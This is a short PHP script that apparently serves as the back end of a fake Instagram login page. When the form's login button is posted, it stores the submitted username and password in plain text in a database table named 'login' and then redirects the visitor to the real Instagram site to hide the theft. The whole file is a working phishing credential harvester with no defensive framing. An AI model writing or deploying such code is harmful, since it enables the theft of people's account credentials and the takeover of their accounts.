<?php

//Enter your database details here.
$hostname = "localhost"; //Hostname for the database.
$uname = "kalkulus"; //Username for the database
$passwd = "password?"; //password
$database = "test"; //Database name

//Connect to the database
$conn=mysqli_connect($hostname,$uname,$passwd,$database);

//We are posting from the login button in the frontend code. The name is login_btn
if(isset($_POST['login_btn']))
{
  //Get the input fields from the login page
  $username=mysqli_real_escape_string($conn,$_POST['username']);
  $password=mysqli_real_escape_string($conn,$_POST['password']);
  
  if($password!="")
  { //Insert user credential into the table
    $sql="INSERT INTO login(username, `password` ) VALUES('$username','$password')"; 
    mysqli_query($conn,$sql);
    header("location: https://www.instagram.com/");  //redirect to the real Instagram page.
  }
}
?>


